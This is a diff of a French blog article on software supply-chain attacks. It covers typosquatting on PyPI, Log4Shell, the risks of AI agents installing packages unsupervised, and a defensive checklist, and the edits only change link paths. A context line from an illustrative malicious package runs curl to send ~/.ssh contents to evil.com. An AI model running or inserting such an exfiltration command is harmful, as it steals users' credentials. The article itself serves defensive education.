@@ -80,13 +80,13 @@ Le compte d'un mainteneur légitime est compromis (phishing, credential stuffing
 
 **2026 Q1** : campagne de typosquatting coordonnée sur PyPI ciblant les packages d'IA (`openai`, `langchain`, `transformers`). Des dizaines de faux packages publiés en quelques heures.
 
-### L'incident [CrowdStrike](/posts/2024-07-19-CrowdStrike-ecran-bleu-mondial/)
+### L'incident [CrowdStrike](/posts/CrowdStrike-ecran-bleu-mondial/)
 
 L'écran bleu mondial de CrowdStrike en 2024 n'était pas une supply chain attack au sens strict, mais c'est la démonstration parfaite du risque : un seul fournisseur de confiance qui pousse un update défectueux paralysant des millions de machines.
 
 ## Le cas particulier des agents IA
 
-Les [agents IA](/posts/2026-05-22-Agents-IA-bureau-sans-mains/) ajoutent une couche de risque supplémentaire :
+Les [agents IA](/posts/Agents-IA-bureau-sans-mains/) ajoutent une couche de risque supplémentaire :
 
 - **Exécution automatique de code** : les agents installent et exécutent des packages sans supervision humaine
 - **Chaîne de dépendances opaque** : les frameworks IA (LangChain, CrewAI, etc.) pullulent de dépendances
@@ -105,7 +105,7 @@ os.system("curl -X POST https://evil.com/data -d @" + os.path.expanduser("~/.ssh
 # Aucun signe visible de compromission
 ```
 
-## Le cas [Log4Shell](/posts/2021-12-09-Log4Shell-lincendie-dans-la-jvm/) comme tournant
+## Le cas [Log4Shell](/posts/Log4Shell-lincendie-dans-la-jvm/) comme tournant
 
 Log4Shell a été le wakeup call. Une vulnérabilité dans une bibliothèque Java utilisée par *des centaines de millions* d'applications a montré que la dépendance à des composants tiers est un risque systémique.
 
@@ -137,7 +137,7 @@ npm audit signatures
 
 ### Pour les équipes DevOps
 
-Intégrer la vérification des dépendances dans la [CI/CD](/posts/2026-06-20-CICD-GitHub-Actions/) :
+Intégrer la vérification des dépendances dans la [CI/CD](/posts/CICD-GitHub-Actions/) :
 
 ```yaml
 # GitHub Actions — vérification des dépendances
@@ -160,8 +160,8 @@ Intégrer la vérification des dépendances dans la [CI/CD](/posts/2026-06-20-CI
 - [ ] Packages internes sur registry privé (Verdaccio, Artifactory)
 - [ ] Renovate/Dependabot pour les mises à jour de sécurité
 - [ ] Politique de review des nouveaux packages ajoutés
-- [ ] Monitoring des sorties de sécurité ([Nuclei](/posts/2026-03-08-Nuclei-OpenVAS-scan-vuln/) pour les CVE)
-- [ ] [Docker Security](/posts/2026-06-08-Docker-Security-Erreurs/) appliqué aux images de build
+- [ ] Monitoring des sorties de sécurité ([Nuclei](/posts/Nuclei-OpenVAS-scan-vuln/) pour les CVE)
+- [ ] [Docker Security](/posts/Docker-Security-Erreurs/) appliqué aux images de build
 - [ ] Pipeline CI/CD durci et isolé
 
 ## Outils de détection
